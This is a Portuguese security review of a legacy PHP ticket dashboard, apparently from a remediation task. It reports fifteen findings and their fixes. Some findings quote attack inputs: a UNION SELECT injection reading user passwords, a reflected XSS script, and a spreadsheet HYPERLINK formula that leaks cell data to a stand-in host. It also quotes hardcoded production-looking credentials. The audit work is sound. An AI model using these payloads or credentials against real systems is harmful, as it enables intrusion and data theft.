# RELATORIO.md — LEB-100-A

## 1. Resumo

O sistema é um painel de chamados em PHP + mysqli (legado de 2013) com três
arquivos de código (`config.php`, `lib.php`, `index.php`) e o banco descrito em
`schema.sql`/`seed.sql`.

O estado encontrado é funcional para o caso feliz, mas **não implementa a regra
de negócio de visibilidade declarada no manifesto** (um cliente vê os chamados
de todos), e concentra falhas de segurança exploráveis pela rota pública:
injeção de SQL no filtro de busca, XSS refletido no mesmo parâmetro e segredos
de produção embutidos no código. Há ainda um erro fatal latente
(divisão por zero) no cálculo de SLA e problemas de desempenho (N+1 consultas)
que degradam com o volume.

A correção foi incremental, **preservando todas as assinaturas públicas**, as
rotas, o formato do CSV e a estrutura HTML da listagem. A maior parte dos
achados foi corrigida; dois foram deliberadamente mantidos e justificados na
seção de Decisões.

| ID | Título curto | Categoria | Severidade | Confiança | Corrigido |
| --- | --- | --- | --- | --- | --- |
| F1 | Injeção de SQL no filtro de busca | seguranca | critica | 98 | sim |
| F2 | Visibilidade de chamados não aplicada | seguranca | critica | 95 | sim |
| F3 | XSS refletido em `busca` | seguranca | alta | 97 | sim |
| F4 | Divisão por zero em `mediaResposta` | bug | alta | 97 | sim |
| F5 | Segredos de produção embutidos em `config.php` | seguranca | alta | 99 | sim |
| F6 | Senhas com MD5 sem salt | seguranca | alta | 90 | não |
| F7 | N+1 consultas em `listarChamados`/export | performance | media | 95 | sim |
| F8 | SQL por concatenação em `tecnicoNome`/`verChamado` | seguranca | media | 75 | sim |
| F9 | CSV/formula injection no export | seguranca | media | 78 | sim |
| F10 | Export grava em arquivo compartilhado em disco | arquitetura | media | 82 | sim |
| F11 | Session fixation no login | seguranca | media | 85 | sim |
| F12 | Média de SLA materializa todas as linhas em PHP | performance | baixa | 85 | sim |
| F13 | `formatarStatus` devolve "Resolvido" p/ valor inválido | qualidade | baixa | 60 | não |
| F14 | Retornos de consulta não verificados | qualidade | baixa | 65 | sim |
| F15 | Cabeçalho CSV sujeito a quoting e `fputcsv` deprecado | qualidade | baixa | 70 | sim |

---

## 2. Achados

### F1 — Injeção de SQL no filtro de busca (`code/lib.php:82`)

**O que é.** Em `listarChamados`, o termo vindo de `index.php?busca=` é
concatenado cru dentro da SQL:

```php
$sql .= " WHERE titulo LIKE '%" . $busca . "%'";
```

**Mecanismo.** O parâmetro `busca` chega de `$_GET['busca']` em `index.php:72`
e é interpolado diretamente. Não há `prepare`/`bind_param` nesse trecho, ao
contrário do `autenticar` que usa consulta parametrizada. Um valor como
`busca=' UNION SELECT senha,login,nome,papel FROM usuarios-- -`
transforma a listagem num vetor de leitura de qualquer coluna do banco; como a
função devolve os registros ao HTML, o atacante exfiltra dados pela própria
tela. Também é possível usar `OR 1=1` para enxergar chamados de terceiros,
reforçando a falha de privacidade (F2).

**Impacto e severidade.** Leitura arbitrária de dados (inclusive `senha` dos
usuários) por qualquer sessão autenticada de cliente. **Crítica.**

**Confiança.** 98 — o fluxo é direto e o parâmetro é controlável por GET.

**O que fiz.** Troquei a concatenação por `prepare` com placeholder
posicional (`WHERE c.titulo LIKE ?`) e `bind_param('s', '%'.$busca.'%')`. O
comportamento funcional (filtro por trecho de título) é idêntico.

### F2 — Regra de visibilidade não é aplicada (`code/index.php:52-74`)

**O que é.** O manifesto define a regra obrigatória: *cliente só vê os próprios
chamados; técnico vê todos*. O código nunca consulta `usuario_id` para
autorizar: `listarChamados` retorna tudo (lib.php:80), `verChamado` busca por
`id` sem checar o dono (lib.php:100) e `exportarCsv` exporta todos os registros
(lib.php:132).

**Mecanismo.** `index.php` calcula `$uid`/`$papel` na sessão, mas não os usa em
nenhuma decisão de leitura. Consequentemente, um cliente logado (ex.: `ana`,
`uid=1`) vê na tabela os chamados de `bruno` (`uid=2`) e, via
`index.php?ver=103`, lê título e descrição de chamados de terceiros. O `id` é
sequencial e trivial de enumerar, então o vazamento não depende de adivinhação.

**Impacto e severidade.** Violação direta do contrato de privacidade do
produto; exposição de descrições de chamados de outros clientes. **Crítica.**

**Confiança.** 95 — a ausência de filtro é explícita no código.

**O que fiz.** (a) na listagem, filtrei em `index.php` os itens cujo
`usuario_id` difere do `uid` quando `$papel === 'cliente'`; (b) no detalhe,
trato como "não encontrado" quando o cliente não é o dono (sem revelar
existência); (c) criei `exportarCsvVisivel($db, $uid, $papel)` e passei a rota
de export a usá-la, enquanto `exportarCsv($db)` continua exportando tudo para
não quebrar a rotina noturna externa. A assinatura pública de `listarChamados`,
`verChamado` e `exportarCsv` foi preservada.

### F3 — XSS refletido no parâmetro `busca` (`code/index.php:79,82`)

**O que é.** O valor de `$_GET['busca']` é impresso sem escaping no
`value=""` do formulário e no texto "Resultados para:".

**Mecanismo.** `index.php:79` faz `value="' . $busca . '"` e `index.php:82`
faz `'Resultados para: ' . $busca`, ambos sem `htmlspecialchars`. Um link
`index.php?busca="><script>...</script>` executa script no navegador da vítima
autenticada, no contexto do domínio do painel, permitindo ler a sessão/DOM e
agir em nome do usuário. Repare que o `titulo` e o `tecnico_nome` são
escapados (index.php:91,94) — o vetor esquecido é justamente o parâmetro
refletido.

**Impacto e severidade.** Execução de script arbitrário na sessão de outro
usuário (também serve para exfiltrar a listagem inteira). **Alta.**

**Confiança.** 97.

**O que fiz.** Calculei `$buscaHtml = htmlspecialchars($busca, ENT_QUOTES,
'UTF-8')` e usei essa variável nos dois pontos, mantendo o texto exibido igual.

### F4 — Divisão por zero em `mediaResposta` (`code/lib.php:116`)

**O que é.** `return $soma / $qtd;` com `$qtd` inicializado em 0 e só
incrementado quando há linhas com `minutos_resposta` não nulo.

**Mecanismo.** Se a tabela estiver vazia ou nenhum chamado tiver
`minutos_resposta` preenchido (estado normal logo após a implantação, ou com
todos os chamados aguardando primeira resposta), o `while` não itera, `$qtd`
permanece 0 e a divisão lança `DivisionByZeroError` no PHP 8 — erro fatal que
derruba a listagem inteira. Com o seed atual há valores, então o bug fica
latente até o primeiro cenário sem respostas.

**Impacto e severidade.** Indisponibilidade da tela principal. **Alta.**

**Confiança.** 97 — comportamento determinístico da linguagem.

**O que fiz.** Substituí o laço por `SELECT AVG(minutos_resposta)` e trato
`NULL`/erro retornando `0.0`. A média e o tipo de retorno (`float`) são
preservados.

### F5 — Segredos de produção embutidos (`code/config.php:12,15`)

**O que é.** A senha do banco (`N3tX@2013!prod`) e a chave da API de e-mail
(`netx-smtp-9f83e2c1a7b64d05`) estão no código como fallback/constante.

**Mecanismo.** Qualquer vazamento do repositório (ou de um backup, ou leitura
do arquivo por outro processo) entrega credenciais de produção diretamente
utilizáveis. O fallback de `DB_PASS` ainda faz o sistema ignorar silenciosamente
a variável de ambiente ausente e operar com senha fixa conhecida.

**Impacto e severidade.** Comprometimento total do banco e do serviço de
e-mail. **Alta.**

**Confiança.** 99.

**O que fiz.** Removi os valores literais; `DB_PASS` e `SMTP_API_KEY` agora
vêm exclusivamente do ambiente (`getenv(...) ?: ''`). Não introduzi dependência
nova. Observação de implantação: é preciso definir essas variáveis no serviço
(ex.: `systemd EnvironmentFile`), comportamento esperado para segredos.

### F6 — Senhas com MD5 sem salt (`code/lib.php:15`)

**O que é.** `$hash = md5($senha)` e comparação de hashes MD5, formato legado
de 2013. `schema.sql:7` declara `senha CHAR(32)`, tamanho exato de um MD5.

**Mecanismo.** MD5 é rápido e sem salt, permitindo tabelas pré-computadas e
ataques de dicionário em massa. Além disso, o formato de 32 caracteres da
coluna **impede** armazenar um `password_hash()` moderno (60+ caracteres): uma
troca ingênua para bcrypt/argon2 quebraria todos os logins existentes e não
caberia no schema.

**Impacto e severidade.** Exposição das senhas caso o banco vaze (e F1
permitia justamente ler a coluna `senha`). **Alta.**

**Confiança.** 90.

**O que fiz (parcial).** Não migrei o algoritmo, por risco de compatibilidade
e por exigir `ALTER TABLE`/migração de hashes — fora do escopo seguro. Endureci
o que era possível sem quebrar contrato: a verificação deixou de acontecer no
`WHERE senha = ?` e passou a usar comparação de tempo constante
(`hash_equals`) para o hash legado, e a função já aceita `password_verify`
caso a coluna venha a ser ampliada. **Recomendação formal:** ampliar
`senha` para `VARCHAR(255)` e re-hashear no próximo login com
`password_needs_rehash`.

### F7 — N+1 consultas na listagem e no export (`code/lib.php:88-89`)

**O que é.** Para cada chamado retornado por `SELECT * FROM chamados`, é feita
uma consulta extra em `tecnicoNome()` para buscar o nome do técnico
(linhas 88-89). O padrão se repete no export (linhas 136-137).

**Mecanismo.** A tela chama uma consulta para os N chamados + N consultas
individuais de técnico (N+1). Como `tecnico_id` repete entre chamados, há
dezenas/centenas de consultas redundantes por carregamento. O mesmo vale para
a exportação, que percorre todas as linhas.

**Impacto e severidade.** Latência e carga desnecessárias no banco; piora
linearmente com o volume de chamados. **Média.**

**Confiança.** 95.

**O que fiz.** Em `listarChamados`, substituí a busca por linha por
`LEFT JOIN usuarios u ON u.id = c.tecnico_id` com alias `tecnico_nome`,
preservando a chave `tecnico_nome` no retorno (inclusive `'-'` quando
`tecnico_id` é nulo). No export, usei o mesmo JOIN. Passa a ser 1 consulta.

### F8 — SQL por concatenação em `tecnicoNome`/`verChamado` (`code/lib.php:69,100`)

**O que é.** `'SELECT ... WHERE id = ' . $tecnicoId` e
`'SELECT * FROM chamados WHERE id = ' . $id`, concatenando em vez de
parametrizar.

**Mecanismo.** Hoje os parâmetros são tipados `?int`/`int`, então o PHP
converte para inteiro e a injeção direta não é possível. Ainda assim, é um
padrão frágil: qualquer refatoração futura que afrouxe o tipo (ou um call site
que passe string) transforma essas linhas em injeção. Não é explorável no
estado atual, mas é dívida de segurança.

**Impacto e severidade.** Sem exploração imediata; risco futuro. **Média.**

**Confiança.** 75 — o problema é real como padrão, mas não há vetor atual
devido à tipagem.

**O que fiz.** Converti as duas consultas para `prepare` + `bind_param('i')`.

### F9 — CSV/formula injection no export (`code/lib.php:138-144`)

**O que é.** Título e nome do técnico são gravados no CSV sem neutralizar
caracteres de início de fórmula.

**Mecanismo.** Um chamado com título `=HYPERLINK("http://malicioso/?leak="&A1,"clique")`
é exportado literalmente. Ao abrir o CSV no Excel/LibreOffice/Sheets, a célula
é interpretada como fórmula e pode disparar links/requisições ou exfiltrar
células vizinhas — o atacante é qualquer cliente que abre um chamado, e a
vítima é o operador que baixa o relatório.

**Impacto e severidade.** Execução de conteúdo em estação administrativa via
arquivo aparentemente inofensivo. **Média.**

**Confiança.** 78.

**O que fiz.** Adicionei `csvCelula()`, que prefixa `'` a valores iniciados por
`= + - @ tab CR`, aplicada a título e técnico. O cabeçalho, as colunas e a
ordem do CSV permanecem exatamente os do contrato.

### F10 — Export grava em arquivo compartilhado em disco (`code/lib.php:125-126,150`)

**O que é.** `exportarCsv` escreve sempre em `EXPORT_DIR/chamados.csv`
(caminho fixo) e depois faz `readfile`.

**Mecanismo.** (a) Duas requisições simultâneas usam o mesmo arquivo: uma pode
`readfile` do conteúdo da outra ou ler um arquivo truncado (corrida). (b) O
arquivo fica persistido em `/var/www/painel/tmp`, fora do ciclo de resposta, e
pode ficar acessível via web conforme a configuração do servidor. (c) Se o
diretório não for gravável (`fopen` retorna `false`), a função retorna em
silêncio sem entregar nada.

**Impacto e severidade.** Vazamento de dados entre sessões/usuários e downloads
corrompidos. **Média.**

**Confiança.** 82.

**O que fiz.** Passei a escrever direto em `php://output` (o contrato diz
"escreve o CSV na saída"), eliminando o arquivo intermediário e a corrida. A
constante `EXPORT_DIR` foi mantida em `config.php` porque pode ser referenciada
por scripts externos; apenas deixou de ser usada por esta função.

### F11 — Session fixation no login (`code/index.php:15,23-25`)

**O que é.** `session_start()` sem regenerar o id, e o login grava
`uid`/`papel` na mesma sessão.

**Mecanismo.** Um atacante que consiga plantar um `PHPSESSID` conhecido na
vítima (link, XSS) faz com que a vítima se autentique nessa sessão; o id não
muda após o login, então o atacante reutiliza a sessão já autenticada. Também
não havia `HttpOnly`/`SameSite`, ampliando o roubo de cookie via XSS (F3).

**Impacto e severidade.** Sequestro de sessão autenticada. **Média.**

**Confiança.** 85.

**O que fiz.** Após autenticar, chamo `session_regenerate_id(true)` antes de
gravar os dados. Configurei o cookie de sessão com `httponly` e `samesite=Lax`
antes do `session_start()`.

### F12 — Média de SLA materializa todas as linhas em PHP (`code/lib.php:109-116`)

**O que é.** `mediaResposta` faz `SELECT minutos_resposta FROM chamados` e
percorre todas as linhas no PHP apenas para somar e contar.

**Mecanismo.** Toda a base é transferida do banco para a aplicação a cada
carregamento da tela, quando `AVG()` resolveria no servidor. É desperdício de
memória e de rede proporcional ao número de chamados.

**Impacto e severidade.** Degradação de desempenho sob volume. **Baixa.**

**Confiança.** 85.

**O que fiz.** Reescrita com `SELECT AVG(minutos_resposta)` (mesma correção de
F4), retornando o agregado diretamente.

### F13 — `formatarStatus` trata qualquer valor inválido como "Resolvido" (`code/lib.php:32-34`)

**O que é.** O `else` final devolve "Resolvido" para status 3 e para qualquer
outro valor (0, 99, negativo).

**Mecanismo.** Se um registro chegar com status fora de {1,2,3} — por exemplo
um `UPDATE` manual ou um status 4 futuro — o relatório gerencial, que faz
correspondência por texto, o classificaria como resolvido, mascarando chamados
abertos. Não há validação no schema (`TINYINT` sem `CHECK`) nem na função.

**Impacto e severidade.** Classificação incorreta silenciosa; risco de dados
relativamente baixo no estado atual. **Baixa.**

**Confiança.** 60 — o contrato só define 1, 2 e 3; classificar o resto como
"Resolvido" é discutível, e mudar o rótulo de retorno quebraria consumidores.

**O que não fiz.** Não alterei a função: o manifesto fixa o mapeamento de
rótulos e não define comportamento para valores fora de {1,2,3}. Introduzir um
rótulo novo ou lançar exceção mudaria o contrato. Recomendo `CHECK` no schema
para impedir o estado inválido na origem.

### F14 — Retornos de consulta não verificados (`code/lib.php:85-88`)

**O que é.** O código chamava `$res->fetch_assoc()` sem checar se `$db->query()`
retornou `false`, e `fopen` de escrita era a única verificação.

**Mecanismo.** Em PHP sem exceções de mysqli (ou versões anteriores a 8.1), uma
consulta malformada retorna `false` e o `fetch_assoc()` subsequente gera erro
fatal em vez de degradar. Em `mediaResposta` e `listarChamados` isso
derrubava a tela; no export, o `return` silencioso do `fopen` não indicava a
falha ao usuário.

**Impacto e severidade.** Robustez/observabilidade; falhas silenciosas ou
fatais em erro de banco. **Baixa.**

**Confiança.** 65.

**O que fiz.** Todas as consultas passaram a checar o retorno de `prepare`
(retornando vazio/nulo/`0.0` conforme o tipo) e o export agora só emite o
cabeçalho HTTP quando a declaração foi preparada com sucesso.

### F15 — Cabeçalho do CSV sujeito a quoting e `fputcsv` deprecado (`code/lib.php:130-144`)

**O que é.** O cabeçalho era emitido via `fputcsv(['ID','Titulo','Status',
'Tecnico','Aberto em'])`, e as linhas também. O manifesto exige o cabeçalho
**exato** `ID,Titulo,Status,Tecnico,Aberto em`.

**Mecanismo.** Versões recentes do PHP passaram a entrecolchear com aspas
campos que contêm espaço, então `Aberto em` sai como `"Aberto em"`, divergindo
do texto literal do contrato (e variando conforme a versão do PHP). Além
disso, `fputcsv()` sem o parâmetro `$escape` está deprecado no PHP 8.4, o que
gera avisos nos logs e tem mudança de comportamento prevista para o PHP 9.

**Impacto e severidade.** Consumidores que comparem o cabeçalho por bytes
podem deixar de reconhecer o arquivo; avisos de depreciação poluem o log.
**Baixa.**

**Confiança.** 70 — a divergência é dependente da versão do PHP, mas o
cabeçalho "exato" é declarado explicitamente no manifesto.

**O que fiz.** O cabeçalho passou a ser gravado literalmente
(`fwrite($out, "ID,Titulo,Status,Tecnico,Aberto em\n")`), garantindo os bytes
do contrato em qualquer versão. As linhas de dados continuam em `fputcsv`, mas
com `$escape` explícito (`',', '"', '\\'`) para preservar o comportamento
atual e silenciar a depreciação.

---

## 3. Decisões (o que NÃO mudei e por quê)

- **Algoritmo de hash (F6).** Não troquei MD5 por bcrypt/argon2. A coluna é
  `CHAR(32)`, menor que qualquer hash moderno, e um `ALTER TABLE` + re-hash de
  todos os usuários é uma migração de dados, não uma correção de código:
  arriscaria deixar todos sem login. Endureci o comparável (`hash_equals`,
  aceitação futura de `password_verify`) e deixei a migração recomendada.
- **`formatarStatus` e `rotuloPrioridade` (F13).** Não toquei. Os rótulos
  exatos (`"Aberto"`, `"Em atendimento"`, `"Resolvido"`) são contrato de valor
  com o relatório gerencial; adicionar tratamento para status inválido mudaria
  a saída para entradas fora do contrato. Registrei como recomendação de
  schema.
- **Camada de dados e stack.** Mantive mysqli e todas as assinaturas
  (`mysqli $db`), conforme a restrição 2. `schema.sql`/`seed.sql` não foram
  alterados para não invalidar o banco de testes do contrato.
- **Rotas, parâmetros e estrutura HTML.** `busca`, `ver`, `export`, a tabela
  `id="tabela-chamados"`, a ordem das colunas e o link `index.php?ver=<id>`
  ficaram idênticos, conforme o manifesto.
- **Formato do CSV.** Cabeçalho `ID,Titulo,Status,Tecnico,Aberto em`, uma linha
  por chamado e ordenação por `id` crescente foram preservados. A única
  diferença é a neutralização de fórmulas (F9), que não altera a estrutura.
- **`exportarCsv($db)` continua exportando tudo.** A rota web passou a usar a
  variante filtrada, mas a função pública manteve o comportamento completo
  para não quebrar a rotina noturna de exportação que a consome.
- **Constante `EXPORT_DIR`.** Mantida em `config.php` mesmo sem uso por
  `exportarCsv`, pois consumidores externos podem referenciá-la.
- **CSRF e rate limiting no login.** Não implementei: exigiriam token/estado
  novo e mudança no HTML do formulário, com ganho pequeno para um painel
  interno legado, e estão fora do escopo "evoluir, não reescrever". Ficam
  registrados como melhoria futura.
- **Ordenação da listagem (`criado_em DESC`).** Mantida. Não é contrato, mas
  alterá-la seria mudança de comportamento sem problema associado.
- **Mensagens de erro de conexão.** Mantive o `die('Falha ao conectar ao
  banco.')`, que já não expõe detalhes do driver.
